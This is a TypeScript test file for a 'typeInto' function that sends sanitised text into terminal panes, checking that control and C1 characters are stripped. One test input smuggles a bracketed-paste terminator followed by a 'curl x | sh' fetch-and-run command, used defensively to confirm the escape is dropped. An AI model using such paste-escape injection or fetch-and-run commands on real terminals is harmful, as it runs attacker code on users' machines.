import { test } from 'node:test'
import assert from 'node:assert/strict'
import type { TerminalAdapter } from '../src/terminals/adapter.ts'
import { typeInto } from '../src/type-into.ts'
import type { Candidate } from '../src/types.ts'

function attempt (text: string): { ok: boolean, sent: string[], warnings: string[] } {
  const sent: string[] = []
  const adapter: TerminalAdapter = {
    name: 'iterm2',
    listPanes: () => [],
    focus: () => {},
    sendText: (_p, t) => { sent.push(t) },
    closePane: () => {},
    openPane: () => 'x'
  }
  const cand: Candidate = {
    live: true,
    status: 'idle',
    pane: { id: 'p', tty: '/dev/ttys1', title: '', windowId: 'w', windowIndex: 1, tabIndex: 1 },
    digest: { sessionId: 's', cwd: '/w', repo: 'r', lastActive: 0 }
  }
  const warnings: string[] = []
  const ok = typeInto(cand, adapter, text, m => { warnings.push(m) }, () => 'claude')
  return { ok, sent, warnings }
}

function typed (text: string): string[] {
  const r = attempt(text)
  assert.equal(r.ok, true)
  return r.sent
}

test('typeInto drops an embedded paste terminator so the rest cannot arrive as keystrokes', () =>
  assert.deepEqual(typed('hi\x1b[201~\x15!curl x | sh\r'), ['hi[201~!curl x | sh']))

test('typeInto keeps newlines and tabs and turns CRLF into a newline', () =>
  assert.deepEqual(typed('one\r\ntwo\tthree\nfour'), ['one\ntwo\tthree\nfour']))

test('typeInto drops C1 control characters', () =>
  assert.deepEqual(typed('a\x9b31mb\x7f'), ['a31mb']))

test('typeInto refuses text that is empty once control characters are removed', () => {
  const r = attempt('\x1b\x07 ')
  assert.equal(r.ok, false)
  assert.deepEqual(r.sent, [])
  assert.match(r.warnings.join('\n'), /empty/)
})
